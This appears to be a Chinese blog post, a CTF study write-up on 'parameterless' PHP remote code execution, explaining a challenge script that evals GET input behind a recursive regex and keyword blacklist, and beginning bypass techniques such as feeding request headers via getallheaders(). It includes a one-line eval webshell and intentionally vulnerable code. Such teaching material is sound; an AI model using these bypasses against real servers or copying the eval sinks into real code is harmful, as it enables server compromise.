
<!DOCTYPE html><html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1" theme-name="Stellar" theme-version="1.28.1">
  
  <meta name="generator" content="Hexo 7.2.0">
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f9fafb">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
  
  <title>php无参数RCE - hybcx's blog</title>

  
    <meta name="description" content="0x01 前言 本文是在做CTF比赛的时候遇到了无参数的RCE，之前也没遇见过这种知识点，故此来学习一番。不过搜寻了许多文章，感觉都是无头无尾的有点混乱，所以我这里也是在 0x02 概述 传统意义上，如果我们有 eval($_GET[&#39;code&#39;]); 即代表我们拥有了一句话木马，可以进行getshell，例如  RCE指的是远程命令执行，服务器后台可以执行eval等代码执行函数，而无参数RCE指">
<meta property="og:type" content="article">
<meta property="og:title" content="php无参数RCE">
<meta property="og:url" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/index.html">
<meta property="og:site_name" content="hybcx&#39;s blog">
<meta property="og:description" content="0x01 前言 本文是在做CTF比赛的时候遇到了无参数的RCE，之前也没遇见过这种知识点，故此来学习一番。不过搜寻了许多文章，感觉都是无头无尾的有点混乱，所以我这里也是在 0x02 概述 传统意义上，如果我们有 eval($_GET[&#39;code&#39;]); 即代表我们拥有了一句话木马，可以进行getshell，例如  RCE指的是远程命令执行，服务器后台可以执行eval等代码执行函数，而无参数RCE指">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231019195043222.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231016213022735.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231016201623717.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231016203821949.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231016203842669.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231016204049031.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231016212802119.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231016212837486.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231016213051418.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231016213255596.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231016213725558.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231016213818955.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231016213844304.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231016213900725.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231016215917779.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231019195234019.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231019195339401.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231019195911649.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231019200007448.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231019200202048.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231016220203860.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231016220319247.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231016220823827.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231016220421631.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231016222011790.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231016222804839.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231016222834646.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231019201247981.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231019201318921.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231019202912045.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231019212815605.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231019213556468.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231019213805874.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231020185935362.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231020190028402.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231020190303241.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231019215144978.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231019215318246.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231019215956586.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231019220052718.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231019220102512.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231019220148448.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231019220158628.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231019220217535.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231019220230330.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231019220237026.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231019220251334.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231020105201190.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231020105232167.png">
<meta property="og:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231020105246550.png">
<meta property="article:published_time" content="2023-10-16T10:55:25.215Z">
<meta property="article:modified_time" content="2024-03-10T07:50:30.784Z">
<meta property="article:author" content="hybcx">
<meta property="article:tag" content="基本知识">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://hybcx.xyz/2023/10/16/php-wu-can-shu-rce/image-20231019195043222.png">
  
  
  
  <meta name="keywords" content="基本知识">

  <!-- feed -->
  
    <link rel="alternate" href="/atom.xml" title="hybcx's blog" type="application/atom+xml">
  

  <link rel="stylesheet" href="/css/main.css?v=1.28.1">

  
    <link rel="shortcut icon" href="/medias/logo.png">
  

  
    
<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">

  

  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'">

<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>
<body>

<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">


<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">hybcx's blog</div><div class="sub normal cap">人生当是精彩的</div><div class="sub hover cap" style="opacity:0"> 何必忧虑未来！</div></a></div></header>

<div class="nav-area">
<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>


<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
</div>
<div class="widgets">


<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/05/12/h-nctf2024/"><span class="title">H&NCTF2024</span></a><a class="item title" href="/2024/04/30/hnctf-2022/"><span class="title">HNCTF2022</span></a><a class="item title" href="/2024/04/23/php-xue-xi-zong-jie/"><span class="title">PHP学习总结</span></a><a class="item title" href="/2024/05/02/misc-shua-ti-zhi-lu/"><span class="title">MISC-刷题之旅</span></a><a class="item title" href="/2024/05/05/tmh-huan-chong-qu-yi-chu/"><span class="title">TMH-缓冲区溢出学习</span></a><a class="item title" href="/2024/05/05/di-shi-wu-jie-quan-qian-bei-wp/"><span class="title">第十五届圈钱杯wp</span></a><a class="item title" href="/2024/03/29/thm-jin-gong-xing-shen-tou-ce-shi/"><span class="title">THM-进攻性渗透测试</span></a><a class="item title" href="/2024/03/26/gdouctf-2023/"><span class="title">GDOUCTF2023</span></a><a class="item title" href="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/"><span class="title">i春秋CTF刷题</span></a><a class="item title" href="/2024/03/24/shell-xue-xi/"><span class="title">shell学习</span></a></div></widget>
</div>
<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/hybchenxing/" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/github-logo2.png"/></a><a class="social" href="https://music.163.com/#/user/home?id=9895561810" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/neteasemusic-icon.png"/></a><a class="social" href="https://space.bilibili.com/1761635300" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/bilibili-icon.png"/></a><a class="social" href="https://muselink.cc/hybcx" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/weChat.png"/></a><a class="social" href="javaScript:void('永夜');" rel="noopener noreferrer"><img class="lazy" id="ThemeM" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/moon.svg"/></a><a class="social" href="javaScript:void('永昼');" rel="noopener noreferrer"><img class="lazy" id="ThemeL" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/sun.svg"/></a></div></footer>
</div></aside><div class="l_main" id="main">





<div class="article banner top">
  <div class="content">
    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/">web知识总结</a></div>
<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2023-10-16T10:55:25.215Z">2023-10-16</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-03-10T07:50:30.784Z">2024-03-10</time></span></div></div></div>
    
    <div class="bottom only-title">
      
      <div class="text-area">
        <h1 class="text title"><span>php无参数RCE</span></h1>
        
      </div>
    </div>
    
  </div>
  </div><article class="md-text content"><h1 id="0x01-前言">0x01 前言</h1>
<p>本文是在做CTF比赛的时候遇到了无参数的RCE，之前也没遇见过这种知识点，故此来学习一番。不过搜寻了许多文章，感觉都是无头无尾的有点混乱，所以我这里也是在</p>
<h1 id="0x02-概述">0x02 概述</h1>
<p>传统意义上，如果我们有</p>
<pre><code class="hljs plaintext">eval($_GET['code']);</code></pre>
<p>即代表我们拥有了一句话木马，可以进行getshell，例如</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231019195043222.png" alt="image-20231019195043222"></p>
<p><code>RCE</code>指的是远程命令执行，服务器后台可以执行<code>eval</code>等代码执行函数，而无参数<code>RCE</code>指的是传参的时候被过滤，我们只能让代码执行形如<code>a(b(c(d())))</code>的代码</p>
<h1 id="0x03-过滤场景">0x03 过滤场景</h1>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'var'</span>])){
    <span class="hljs-keyword">if</span>(<span class="hljs-string">';'</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">'/[^\W]+\((?R)?\)/'</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'var'</span>])) {
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/et|dir|na|info|dec|oct|pi|log/i'</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'var'</span>])) {
               <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'var'</span>]);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"Sorry!"</span>);
        }
}
<span class="hljs-keyword">else</span>{
    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>关键代码</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-string">';'</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">'/[^\W]+\((?R)?\)/'</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'var'</span>])) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/et|dir|na|info|dec|oct|pi|log/i'</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'var'</span>])) {
        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'var'</span>]);
    } 
}</code></pre>
<ul>
<li>首先分析外层正则表达式<code>[^\W]+\((?R)?\)</code></li>
</ul>
<pre><code class="hljs plaintext">`^`表示取反

`\W`代表匹配非字母、数字、下划线，等价于[^A-Za-z0-9_]

上面两点加一块，代表匹配所有字母数字下划线

`+`代表字母数字下划线匹配至少一个

`\(` `\)` 代表匹配括号本身

`(?R)`表示递归表达式本身

`(?R)?` 最后的`?`表示匹配1个或者0个表达式本身

综上：这个表达式其实就是匹配形如`a(b(c(d())));`的字符串，最终前面的字符串会被替换为';'，于是可以返回true而跳到下一个if语句。</code></pre>
<ul>
<li>内层表达式<code>et|dir|na|info|dec|oct|pi|log</code></li>
</ul>
<p>输入的字符串不能包含<code>et、dir、na、info、dec、oct、pi、log</code>字符串</p>
<p><code>/i</code>表示忽略大小写，上面的黑名单字符串及时大小写也不能进行绕过</p>
<h1 id="0x04-绕过方法">0x04 绕过方法</h1>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'var'</span>])){
    <span class="hljs-keyword">if</span>(<span class="hljs-string">';'</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">'/[^\W]+\((?R)?\)/'</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'var'</span>])) {
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"successful!"</span>;
		<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'var'</span>]);
		} 
	<span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"Sorry!"</span>);
        }
}
<span class="hljs-keyword">else</span>{
    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);
}
<span class="hljs-meta">?&gt;</span></code></pre>
<h2 id="41-getallheaders">4.1 getallheaders()</h2>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231016213022735.png" alt="image-20231016213022735"></p>
<p>这里呢返回值是数字，失败返回false</p>
<p>以下的测试代码是：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span> (<span class="hljs-string">';'</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">'/[^\W]+\((?R)?\)/'</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'code'</span>])) {
    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'code'</span>]);
}
<span class="hljs-keyword">else</span>{
    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>apache2环境下，函数返回所有请求头信息，这个是<code>apache</code>的函数</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
	<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">getallheaders</span>());
<span class="hljs-meta">?&gt;</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231016201623717.png" alt="image-20231016201623717"></p>
<p>如上图，其返回的是一些头部信息，我们可以抓包来自定义一些头部信息</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231016203821949.png" alt="image-20231016203821949"></p>
<p>取出我们自定义的头部信息</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
	<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">end</span>(<span class="hljs-title function_ invoke__">getallheaders</span>()));
<span class="hljs-meta">?&gt;</span></code></pre>
